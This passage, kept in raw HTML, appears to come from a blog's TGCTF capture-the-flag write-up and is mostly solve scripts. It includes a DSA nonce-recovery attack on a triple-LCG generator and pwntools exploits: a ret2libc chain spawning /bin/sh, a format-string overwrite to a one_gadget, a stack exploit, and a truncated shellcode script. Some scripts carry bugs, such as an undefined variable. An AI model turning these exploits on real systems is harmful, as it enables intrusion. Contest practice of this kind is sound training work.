class="string">b&#x27;TGCTF&#x27;</span> <span class="keyword">in</span> m:</span><br><span class="line">                    <span class="built_in">print</span>(m.decode())</span><br><span class="line"><span class="comment"># TGCTF&#123;🙇🏮🤟_🫡🫡🫡_🚩🚩🚩&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="LLLCG">LLLCG</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> crt</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TripleLCG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed1, seed2, seed3, a, b, c, d, n</span>):</span><br><span class="line">        <span class="variable language_">self</span>.state = [seed1, seed2, seed3]</span><br><span class="line">        <span class="variable language_">self</span>.a = a</span><br><span class="line">        <span class="variable language_">self</span>.b = b</span><br><span class="line">        <span class="variable language_">self</span>.c = c</span><br><span class="line">        <span class="variable language_">self</span>.d = d</span><br><span class="line">        <span class="variable language_">self</span>.n = n</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        new = (<span class="variable language_">self</span>.a * <span class="variable language_">self</span>.state[-<span class="number">3</span>] + <span class="variable language_">self</span>.b * <span class="variable language_">self</span>.state[-<span class="number">2</span>] + <span class="variable language_">self</span>.c * <span class="variable language_">self</span>.state[-<span class="number">1</span>] + <span class="variable language_">self</span>.d) % <span class="variable language_">self</span>.n</span><br><span class="line">        <span class="variable language_">self</span>.state.append(new)</span><br><span class="line">        <span class="keyword">return</span> new</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DSA</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># while True:</span></span><br><span class="line">            <span class="comment"># self.q = getPrime(160)</span></span><br><span class="line">            <span class="comment"># t = 2 * getPrime(1024 - 160) * self.q</span></span><br><span class="line">            <span class="comment"># if isPrime(t + 1):</span></span><br><span class="line">            <span class="comment">#    self.p = t + 1</span></span><br><span class="line">            <span class="comment">#    break</span></span><br><span class="line">        <span class="variable language_">self</span>.p = dsa_p</span><br><span class="line">        <span class="variable language_">self</span>.q = dsa_q</span><br><span class="line">        <span class="variable language_">self</span>.g = <span class="built_in">pow</span>(<span class="number">2</span>, (<span class="variable language_">self</span>.p - <span class="number">1</span>) // <span class="variable language_">self</span>.q, <span class="variable language_">self</span>.p)</span><br><span class="line">        <span class="variable language_">self</span>.x = randint(<span class="number">1</span>, <span class="variable language_">self</span>.q - <span class="number">1</span>)</span><br><span class="line">        <span class="variable language_">self</span>.y = <span class="built_in">pow</span>(<span class="variable language_">self</span>.g, <span class="variable language_">self</span>.x, <span class="variable language_">self</span>.p)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">self, msg, k</span>):</span><br><span class="line">        h = bytes_to_long(sha256(msg).digest())</span><br><span class="line">        r = <span class="built_in">pow</span>(<span class="variable language_">self</span>.g, k, <span class="variable language_">self</span>.p) % <span class="variable language_">self</span>.q</span><br><span class="line">        s = (inverse(k, <span class="variable language_">self</span>.q) * (h + <span class="variable language_">self</span>.x * r)) % <span class="variable language_">self</span>.q</span><br><span class="line">        <span class="keyword">return</span> (r, s)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self, msg, r, s</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">0</span> &lt; r &lt; <span class="variable language_">self</span>.q <span class="keyword">and</span> <span class="number">0</span> &lt; s &lt; <span class="variable language_">self</span>.q):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        h = bytes_to_long(sha256(msg).digest())</span><br><span class="line">        w = inverse(s, <span class="variable language_">self</span>.q)</span><br><span class="line">        u1 = (h * w) % <span class="variable language_">self</span>.q</span><br><span class="line">        u2 = (r * w) % <span class="variable language_">self</span>.q</span><br><span class="line">        v = ((<span class="built_in">pow</span>(<span class="variable language_">self</span>.g, u1, <span class="variable language_">self</span>.p) * <span class="built_in">pow</span>(<span class="variable language_">self</span>.y, u2, <span class="variable language_">self</span>.p)) % <span class="variable language_">self</span>.p) % <span class="variable language_">self</span>.q</span><br><span class="line">        <span class="keyword">return</span> v == r</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node1.tgctf.woooo.tech&#x27;</span>,<span class="number">32052</span>)</span><br><span class="line"></span><br><span class="line">primes = [<span class="number">59093</span>, <span class="number">65371</span>, <span class="number">37337</span>, <span class="number">43759</span>, <span class="number">52859</span>, <span class="number">39541</span>, <span class="number">60457</span>, <span class="number">61469</span>, <span class="number">43711</span>]</span><br><span class="line">io.recvline()</span><br><span class="line">io.recvline()</span><br><span class="line">data = io.recvline().strip().split(<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="built_in">int</span>(data[<span class="number">2</span>][:-<span class="number">1</span>])</span><br><span class="line">q = <span class="built_in">int</span>(data[<span class="number">5</span>][:-<span class="number">1</span>])</span><br><span class="line">g = <span class="built_in">int</span>(data[<span class="number">8</span>][:-<span class="number">1</span>])</span><br><span class="line">y = <span class="built_in">int</span>(data[<span class="number">11</span>][:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;q = <span class="subst">&#123;q&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;g = <span class="subst">&#123;g&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;y = <span class="subst">&#123;y&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;[-] &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ks_p = []</span><br><span class="line">rs = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;[-] &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    data_ = io.recvline().strip().split(<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line">    r = <span class="built_in">int</span>(data_[<span class="number">2</span>][:-<span class="number">1</span>])</span><br><span class="line">    rs.append(r)</span><br><span class="line">    ks = <span class="built_in">eval</span>(<span class="string">b&#x27;&#x27;</span>.join([data_[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">14</span>)]))</span><br><span class="line">    ks_p.append(ks)</span><br><span class="line"></span><br><span class="line">kv = []</span><br><span class="line"><span class="keyword">for</span> res <span class="keyword">in</span> ks_p:</span><br><span class="line">    k,_ = crt(primes,res)</span><br><span class="line">    kv.append(k)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;kv = <span class="subst">&#123;kv&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delta = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(kv)):</span><br><span class="line">    delta.append(kv[i]-kv[i-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">M = Matrix(ZZ,[[delta[<span class="number">0</span>],delta[<span class="number">1</span>],delta[<span class="number">2</span>]],</span><br><span class="line">                [delta[<span class="number">1</span>],delta[<span class="number">2</span>],delta[<span class="number">3</span>]],</span><br><span class="line">                [delta[<span class="number">2</span>],delta[<span class="number">3</span>],delta[<span class="number">4</span>]]])</span><br><span class="line"></span><br><span class="line">A = Matrix(ZZ,[delta[<span class="number">3</span>],delta[<span class="number">4</span>],delta[<span class="number">5</span>]])</span><br><span class="line"></span><br><span class="line">res = M.solve_left(A)</span><br><span class="line">a,b,c = res.<span class="built_in">list</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_diff</span>(<span class="params">a, b, c, delta_prev3, delta_prev2, delta_prev1, delta_current</span>):</span><br><span class="line">    delta_pred = a * delta_prev3 + b * delta_prev2 + c * delta_prev1</span><br><span class="line">    <span class="keyword">return</span> delta_pred - delta_current</span><br><span class="line"></span><br><span class="line">diffs = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, <span class="number">11</span>):</span><br><span class="line">    delta_prev3 = kv[i-<span class="number">2</span>] - kv[i-<span class="number">3</span>]</span><br><span class="line">    delta_prev2 = kv[i-<span class="number">1</span>] - kv[i-<span class="number">2</span>]</span><br><span class="line">    delta_prev1 = kv[i] - kv[i-<span class="number">1</span>]</span><br><span class="line">    delta_current = kv[i+<span class="number">1</span>] - kv[i]</span><br><span class="line">    diff = compute_diff(a, b, c, delta_prev3, delta_prev2, delta_prev1, delta_current)</span><br><span class="line">    diffs.append(<span class="built_in">abs</span>(diff))</span><br><span class="line"></span><br><span class="line">n_candidate = gcd(diffs)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;候选 n:&quot;</span>, n_candidate)</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">int</span>(<span class="built_in">str</span>(n_candidate)[:<span class="built_in">str</span>(n_candidate).index(<span class="string">&#x27;/&#x27;</span>)])</span><br><span class="line"><span class="built_in">print</span>(isPrime(n))</span><br><span class="line">d = (kv[<span class="number">3</span>] - a * kv[<span class="number">0</span>] - b * kv[<span class="number">1</span>] - c * kv[<span class="number">2</span>])%n</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;a = <span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;b = <span class="subst">&#123;b&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;d = <span class="subst">&#123;d&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>((a * kv[<span class="number">2</span>] + b * kv[<span class="number">3</span>] + c * kv[<span class="number">4</span>]+d)%n == kv[<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line">lcg = TripleLCG(kv[-<span class="number">3</span>], kv[-<span class="number">2</span>], kv[-<span class="number">1</span>], a, b, c, d, n)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Part 2\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">307</span>):</span><br><span class="line">    <span class="built_in">print</span>(_)</span><br><span class="line">    k = lcg.<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">r_list = []</span><br><span class="line">s_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;[-] &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    data = io.recvline().strip().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    r_list.append(<span class="built_in">int</span>(data[<span class="number">3</span>][:-<span class="number">1</span>]))</span><br><span class="line">    s_list.append(<span class="built_in">int</span>(data[<span class="number">6</span>]))</span><br><span class="line"></span><br><span class="line">msg = <span class="string">b&#x27;1&#x27;</span></span><br><span class="line">h = bytes_to_long(sha256(msg).digest())</span><br><span class="line">k = lcg.<span class="built_in">next</span>()</span><br><span class="line">x = ((s_list[<span class="number">0</span>]*k-h)*inverse(r_list[<span class="number">0</span>],q)) % q</span><br><span class="line"></span><br><span class="line">msg1 = <span class="string">b&quot;1&quot;</span></span><br><span class="line">h1 = bytes_to_long(sha256(msg1).digest())</span><br><span class="line">k1 = lcg.<span class="built_in">next</span>()</span><br><span class="line">x1 = ((s_list[<span class="number">1</span>] * k1 - h1) * inverse(r_list[<span class="number">1</span>], q)) % q</span><br><span class="line"><span class="keyword">assert</span> x == x1</span><br><span class="line"></span><br><span class="line">final_msg = <span class="string">b&#x27;2&#x27;</span></span><br><span class="line">h_ = bytes_to_long(sha256(final_msg).digest())</span><br><span class="line">k_ = <span class="number">1</span></span><br><span class="line">r_final = <span class="built_in">pow</span>(g,k_final,p)%q</span><br><span class="line">s_final = ((h_+x*r_final)*inverse(k_final,q))%q</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Part 2\n&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;[-] &#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;[-] &#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(r_final))</span><br><span class="line"></span><br><span class="line">io.recvline(<span class="string">b&#x27;[-] &#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(s_final))</span><br><span class="line"><span class="comment"># TGCTF&#123;aa8eddd9-df36-1d2c-66b8-f8370013f4cf&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="Pwn：">Pwn：</h2>
<h3 id="签到">签到</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.<span class="title function_">update</span>(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"># context.<span class="property">timeout</span> = <span class="number">5</span></span><br><span class="line">context.<span class="property">log_level</span> = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.<span class="property">terminal</span> = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = <span class="title function_">ELF</span>(binary, checksec=<span class="title class_">False</span>)</span><br><span class="line"><span class="variable constant_">DEBUG</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> <span class="attr">DEBUG</span>:</span><br><span class="line">    libc = elf.<span class="property">libc</span></span><br><span class="line">    p = <span class="title function_">process</span>(binary)</span><br><span class="line"><span class="attr">else</span>:</span><br><span class="line">    libc = <span class="title function_">ELF</span>(<span class="string">&#x27;./libc.so.6&#x27;</span>, checksec=<span class="title class_">False</span>)</span><br><span class="line">    host = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    p = <span class="title function_">remote</span>(host,port)</span><br><span class="line"></span><br><span class="line">sla = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendlineafter</span>(delim, data)</span><br><span class="line">sa  = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendafter</span>(delim, data)</span><br><span class="line">s   = lambda <span class="attr">data</span>:            p.<span class="title function_">send</span>(data)</span><br><span class="line">sl  = lambda <span class="attr">data</span>:            p.<span class="title function_">sendline</span>(data)</span><br><span class="line">ru  = lambda delim, **<span class="attr">kwargs</span>: p.<span class="title function_">recvuntil</span>(delim, **kwargs)</span><br><span class="line">io  = <span class="attr">lambda</span>:                 p.<span class="title function_">interactive</span>()</span><br><span class="line">log = lambda name, <span class="attr">data</span>:      <span class="title function_">success</span>(f<span class="string">&#x27;&#123;name&#125;: &#123;data:#x&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401176</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">main</span>():</span><br><span class="line">    <span class="title function_">ru</span>(b<span class="string">&#x27;name.\n&#x27;</span>)</span><br><span class="line">    pay = b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x78</span> + <span class="title function_">fit</span>(pop_rdi_ret, elf.<span class="property">got</span>[<span class="string">&#x27;puts&#x27;</span>], elf.<span class="property">plt</span>[<span class="string">&#x27;puts&#x27;</span>], elf.<span class="property">sym</span>[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">    <span class="title function_">sl</span>(pay)</span><br><span class="line"></span><br><span class="line">    libc.<span class="property">address</span> = <span class="title function_">u64</span>(<span class="title function_">ru</span>(b<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:] + b<span class="string">&#x27;\x00\x00&#x27;</span>) - libc.<span class="property">sym</span>[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    <span class="title function_">log</span>(<span class="string">&#x27;libc&#x27;</span>, libc.<span class="property">address</span>)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">ru</span>(b<span class="string">&#x27;name.\n&#x27;</span>)</span><br><span class="line">    pay = b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x78</span> + <span class="title function_">fit</span>(pop_rdi_ret + <span class="number">1</span>, pop_rdi_ret, <span class="title function_">next</span>(libc.<span class="title function_">search</span>(b<span class="string">&#x27;/bin/sh\x00&#x27;</span>)), libc.<span class="property">sym</span>[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">    <span class="title function_">sl</span>(pay)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">io</span>()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="title function_">main</span>()</span><br></pre></td></tr></table></figure>
<h3 id="fmt">fmt</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.<span class="title function_">update</span>(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"># context.<span class="property">timeout</span> = <span class="number">5</span></span><br><span class="line">context.<span class="property">log_level</span> = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.<span class="property">terminal</span> = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = <span class="title function_">ELF</span>(binary, checksec=<span class="title class_">False</span>)</span><br><span class="line"><span class="variable constant_">DEBUG</span> = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> <span class="attr">DEBUG</span>:</span><br><span class="line">    libc = elf.<span class="property">libc</span></span><br><span class="line">    p = <span class="title function_">process</span>(binary)</span><br><span class="line"><span class="attr">else</span>:</span><br><span class="line">    libc = <span class="title function_">ELF</span>(<span class="string">&#x27;./libc.so.6&#x27;</span>, checksec=<span class="title class_">False</span>)</span><br><span class="line">    host = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    p = <span class="title function_">remote</span>(host,port)</span><br><span class="line"></span><br><span class="line">sla = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendlineafter</span>(delim, data)</span><br><span class="line">sa  = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendafter</span>(delim, data)</span><br><span class="line">s   = lambda <span class="attr">data</span>:            p.<span class="title function_">send</span>(data)</span><br><span class="line">sl  = lambda <span class="attr">data</span>:            p.<span class="title function_">sendline</span>(data)</span><br><span class="line">ru  = lambda delim, **<span class="attr">kwargs</span>: p.<span class="title function_">recvuntil</span>(delim, **kwargs)</span><br><span class="line">io  = <span class="attr">lambda</span>:                 p.<span class="title function_">interactive</span>()</span><br><span class="line">log = lambda name, <span class="attr">data</span>:      <span class="title function_">success</span>(f<span class="string">&#x27;&#123;name&#125;: &#123;data:#x&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x404010</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">main</span>():</span><br><span class="line">    <span class="title function_">ru</span>(b<span class="string">&#x27;gift &#x27;</span>)</span><br><span class="line">    buf_addr = <span class="title function_">int</span>(<span class="title function_">ru</span>(b<span class="string">&#x27;\n&#x27;</span>, drop=<span class="title class_">True</span>), <span class="number">16</span>)</span><br><span class="line">    target = buf_addr - <span class="number">0x8</span></span><br><span class="line">    ret_addr = buf_addr + <span class="number">0x68</span></span><br><span class="line">    <span class="title function_">log</span>(<span class="string">&#x27;buf&#x27;</span>, buf_addr)</span><br><span class="line"></span><br><span class="line">    pay = f<span class="string">&#x27;%19$p%&#123;0x31-14&#125;c%8$hhn&#x27;</span>.<span class="title function_">encode</span>().<span class="title function_">ljust</span>(<span class="number">0x10</span>, b<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    pay += <span class="title function_">p64</span>(target)</span><br><span class="line">    <span class="title function_">sa</span>(<span class="string">&quot;name\n&quot;</span>, pay)</span><br><span class="line"></span><br><span class="line">    libc.<span class="property">address</span> = <span class="title function_">int</span>(p.<span class="title function_">recvn</span>(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">0x24083</span></span><br><span class="line">    one = libc.<span class="property">address</span> + <span class="number">0xe3b01</span></span><br><span class="line">    <span class="title function_">log</span>(<span class="string">&#x27;libc&#x27;</span>, libc.<span class="property">address</span>)</span><br><span class="line"></span><br><span class="line">    pay = f<span class="string">&#x27;%&#123;0x31&#125;c%10$hhn%&#123;(one &amp; 0xffff) - 0x31&#125;c%11$hn&#x27;</span>.<span class="title function_">encode</span>().<span class="title function_">ljust</span>(<span class="number">0x20</span>, b<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    pay += <span class="title function_">p64</span>(target) + <span class="title function_">p64</span>(ret_addr)</span><br><span class="line">    <span class="title function_">sa</span>(<span class="string">&quot;name\n&quot;</span>, pay)</span><br><span class="line"></span><br><span class="line">    pay = f<span class="string">&#x27;%&#123;0x31&#125;c%10$hhn%&#123;((one &gt;&gt; 16) &amp; 0xffff) - 0x31&#125;c%11$hn&#x27;</span>.<span class="title function_">encode</span>().<span class="title function_">ljust</span>(<span class="number">0x20</span>, b<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    pay += <span class="title function_">p64</span>(target) + <span class="title function_">p64</span>(ret_addr + <span class="number">2</span>)</span><br><span class="line">    <span class="title function_">sa</span>(<span class="string">&quot;name\n&quot;</span>, pay)</span><br><span class="line"></span><br><span class="line">    # gdb.<span class="title function_">attach</span>(p, <span class="string">&quot;b *0x401299&quot;</span>)</span><br><span class="line">    <span class="title function_">sa</span>(b<span class="string">&#x27;name\n&#x27;</span>, b<span class="string">&#x27;win\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="title function_">io</span>()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="title function_">main</span>()</span><br></pre></td></tr></table></figure>
<h3 id="stack">stack</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.<span class="title function_">update</span>(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"># context.<span class="property">timeout</span> = <span class="number">5</span></span><br><span class="line">context.<span class="property">log_level</span> = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.<span class="property">terminal</span> = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = <span class="title function_">ELF</span>(binary, checksec=<span class="title class_">False</span>)</span><br><span class="line"><span class="variable constant_">DEBUG</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> <span class="attr">DEBUG</span>:</span><br><span class="line">    libc = elf.<span class="property">libc</span></span><br><span class="line">    p = <span class="title function_">process</span>(binary)</span><br><span class="line"><span class="attr">else</span>:</span><br><span class="line">    # libc = <span class="title function_">ELF</span>(<span class="string">&#x27;&#x27;</span>, checksec=<span class="title class_">False</span>)</span><br><span class="line">    host = <span class="string">&#x27;node1.tgctf.woooo.tech&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;30393&#x27;</span></span><br><span class="line">    p = <span class="title function_">remote</span>(host,port)</span><br><span class="line"></span><br><span class="line">sla = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendlineafter</span>(delim, data)</span><br><span class="line">sa  = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendafter</span>(delim, data)</span><br><span class="line">s   = lambda <span class="attr">data</span>:            p.<span class="title function_">send</span>(data)</span><br><span class="line">sl  = lambda <span class="attr">data</span>:            p.<span class="title function_">sendline</span>(data)</span><br><span class="line">ru  = lambda delim, **<span class="attr">kwargs</span>: p.<span class="title function_">recvuntil</span>(delim, **kwargs)</span><br><span class="line">io  = <span class="attr">lambda</span>:                 p.<span class="title function_">interactive</span>()</span><br><span class="line">log = lambda name, <span class="attr">data</span>:      <span class="title function_">success</span>(f<span class="string">&#x27;&#123;name&#125;: &#123;data:#x&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">main</span>():</span><br><span class="line">    <span class="title function_">ru</span>(b<span class="string">&#x27;name?\n&#x27;</span>)</span><br><span class="line">    pay = b<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x40</span> + <span class="title function_">fit</span>(<span class="number">0x3b</span>, <span class="number">0x404108</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="title function_">s</span>(pay)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">ru</span>(b<span class="string">&#x27;say?\n&#x27;</span>)</span><br><span class="line">    pay = b<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x40</span> + <span class="title function_">fit</span>(<span class="number">0x404060</span>, <span class="number">0</span>)</span><br><span class="line">    # gdb.<span class="title function_">attach</span>(p, <span class="string">&quot;b *0x401229&quot;</span>)</span><br><span class="line">    <span class="title function_">s</span>(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="title function_">io</span>()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="title function_">main</span>()</span><br></pre></td></tr></table></figure>
<h3 id="shellcode">shellcode</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.<span class="title function_">update</span>(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"># context.<span class="property">timeout</span> = <span class="number">5</span></span><br><span class="line">context.<span class="property">log_level</span> = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.<span class="property">terminal</span> = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = <span class="title function_">ELF</span>(binary, checksec=<span class="title class_">False</span>)</span><br><span class="line"><span class="variable constant_">DEBUG</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> <span class="attr">DEBUG</span>:</span><br><span class="line">    libc = elf.<span class="property">libc</span></span><br><span class="line">    p = <span class="title function_">process</span>(binary)</span><br><span class="line"><span class="attr">else</span>:</span><br><span class="line">    # libc = <span class="title function_">ELF</span>(<span class="string">&#x27;&#x27;</span>, checksec=<span class="title class_">False</span>)</span><br><span class="line">    host = <span class="string">&#x27;node2.tgctf.woooo.tech&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;31114&#x27;</span></span><br><span class="line">    p = <span class="title function_">remote</span>(host,port)</span><br><span class="line"></span><br><span class="line">sla = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendlineafter</span>(delim, data)</span><br><span class="line">sa  = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendafter</span>(delim, data)</span><br><span class="line">s   = lambda <span class="attr">data</span>:            p.<span class="title function_">send</span>(data)</span><br><span class="line">sl  = lambda <span class="attr">data</span>:            p.<span class="title function_">sendline</span>(data)</span><br><span class="line">ru  = lambda delim, **<span class="attr">kwargs</span>: p.<span class="title function_">recvuntil</span>(delim, **kwargs)</span><br><span class="line">io  = <span class="attr">lambda</span>:                 p.<span class="title function_">interactive</span>()</span><br><span class="line">log = lambda name, <span class="attr">data</span>:      <span class="title function_">success</span>(f<span class="string">&#x27;&#123;name&#125;: &#123;data:#x&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">main</span>():</span><br><span class="line">    <span class="title function_">ru</span>(b<span class="string">&#x27;strength \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    shellcode = <span class="title function_">asm</span>(<span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">mov al, 